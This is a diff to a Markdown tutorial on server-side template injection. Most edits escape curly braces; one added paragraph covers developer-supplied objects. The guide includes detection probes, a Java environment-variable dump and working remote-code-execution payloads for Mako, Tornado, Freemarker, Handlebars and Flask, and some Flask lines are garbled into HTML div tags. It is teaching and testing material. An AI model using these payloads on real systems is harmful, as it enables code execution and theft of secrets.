@@ -24,7 +24,7 @@ $output = $twig->render("Dear " . $_GET['name']);
 The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions
 
 ```
-${{<%[%'"}}%\
+$\{\{<%[%'"\}\}%\
 <%=foo%>
 ```
 > **Note**: If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way.
@@ -37,7 +37,7 @@ By setting mathematical operations as the value of the parameter, we can test wh
 
 ```
 render('Hello ' + username)
-http://vulnerable-website.com/?username=${7*7}
+http://vulnerable-website.com/?username=$\{7*7\}
 ```
 
 > **Note**: If it's vulnerable the result will be `Hello 49`.
@@ -48,7 +48,7 @@ In other cases, the vulnerability is exposed by user input being placed within a
 
 ```
 greeting = getQueryParameter('greeting')
-engine.render("Hello {{"+greeting+"}}", data)
+engine.render("Hello \{\{"+greeting+"\}\}", data)
 
 http://vulnerable-website.com/?greeting=data.username
 ```
@@ -63,7 +63,7 @@ http://vulnerable-website.com/?greeting=data.username<tag>
 2. Next step is to try to break out the statement using common template syntax.
 
 ```
-http://vulnerable-website.com/?greeting=data.username}}<tag>
+http://vulnerable-website.com/?greeting=data.username\}\}<tag>
 ```
 > **Note**: If this results as a blank result `Hello` it means that we used a syntax from the wrong templating language.
 
@@ -118,8 +118,14 @@ Many template engines expose a "self" or "environment" object of some kind, whic
 For exampple, in Java-based templating languages, you can sometimes list all variables in the environment with:
 
 ```
-${T(java.lang.System).getenv()}
+$\{T(java.lang.System).getenv()\}
 ```
+
+### Developer-supplied objects
+
+It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. You should pay particular attention to these non-standard objects because they are especially likely to contain sensitive information or exploitable methods. As these objects can vary between different templates within the same website, be aware that you might need to study an object's behavior in the context of each distinct template before you find a way to exploit it.
+
+
 
 # Examples of different syntax languages
 
@@ -140,7 +146,7 @@ Learning the basic syntax is obviously important, along with key functions and h
 import os
 x=os.popen('id').read()
 %>
-${x}
+$\{x\}
 ```
 
 ## Tornado
@@ -148,14 +154,14 @@ ${x}
 Here we can see an RCE payload to tornado.
 
 ```
-{% import os %}{{ os.popen("whoami").read() }}
+\{% import os %\}\{\{ os.popen("whoami").read() \}\}
 ```
 
 ## Freemarker
 
 Here we can see an RCE payload to freemaker.
 ```
-${"freemarker.template.utility.Execute"?new()("id")}
+$\{"freemarker.template.utility.Execute"?new()("id")\}
 ```
 
 ## Handlebars
@@ -168,25 +174,25 @@ This payload only work in handlebars versions, fixed in [https://github.com/advi
 
 
 ```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('id');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
+\{\{#with "s" as |string|\}\}
+  \{\{#with "e"\}\}
+    \{\{#with split as |conslist|\}\}
+      \{\{this.pop\}\}
+      \{\{this.push (lookup string.sub "constructor")\}\}
+      \{\{this.pop\}\}
+      \{\{#with string.split as |codelist|\}\}
+        \{\{this.pop\}\}
+        \{\{this.push "return require('child_process').execSync('id');"\}\}
+        \{\{this.pop\}\}
+        \{\{#each conslist\}\}
+          \{\{#with (string.sub.apply 0 codelist)\}\}
+            \{\{this\}\}
+          \{\{/with\}\}
+        \{\{/each\}\}
+      \{\{/with\}\}
+    \{\{/with\}\}
+  \{\{/with\}\}
+\{\{/with\}\}
 ```
 
 ## Flask
@@ -196,8 +202,8 @@ Flask is a framework for web applications written in Python and developed from t
 ### Syntax SSTI
 
 ```python
-{{7*7}}
-{{ varname }}
+\{\{7*7\}\}
+\{\{ varname \}\}
 
 <div data-gb-custom-block data-tag="if" data-1='1'></div>PRINT<div data-gb-custom-block data-tag="else">NOPRINT</div>
 
@@ -206,7 +212,7 @@ Flask is a framework for web applications written in Python and developed from t
 ### RCE (Remote Code Execution)
 
 ```python
-<div data-gb-custom-block data-tag="for"><div data-gb-custom-block data-tag="if" data-0='warning'>{{x()._module.__builtins__['__import__']('os').popen("touch /tmp/RCE.txt").read()}}</div></div>
+<div data-gb-custom-block data-tag="for"><div data-gb-custom-block data-tag="if" data-0='warning'>\{\{x()._module.__builtins__['__import__']('os').popen("touch /tmp/RCE.txt").read()\}\}</div></div>
 ```
 
 To bypass some restrictions take a look at the following resources:
